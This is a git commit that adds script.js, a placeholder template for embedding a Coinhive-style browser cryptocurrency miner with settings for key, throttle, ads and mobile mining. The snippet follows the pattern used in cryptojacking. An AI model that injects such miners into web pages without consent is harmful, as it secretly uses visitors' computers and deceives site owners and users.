d8e86aa9906678f8c12d372a84f23cf45da15836
YURII YEVSTRATOV <programbit1@gmail.com>
2023-11-21 10:27:11 +0200

    first commit

---
+++ script.js
@@ -0,0 +1,7 @@
+<script nonce="RLfprnVWlRv1KJFIWdBcNQ\u003D\u003D" src="@Script"></script>
+<script nonce="RLfprnVWlRv1KJFIWdBcNQ\u003D\u003D">
+    var @variable = new Client.Anonymous('@key', {
+        throttle: @throt @currencymodifier @showAds
+    });
+    @stopmobilemining @variable.start();
+</script>
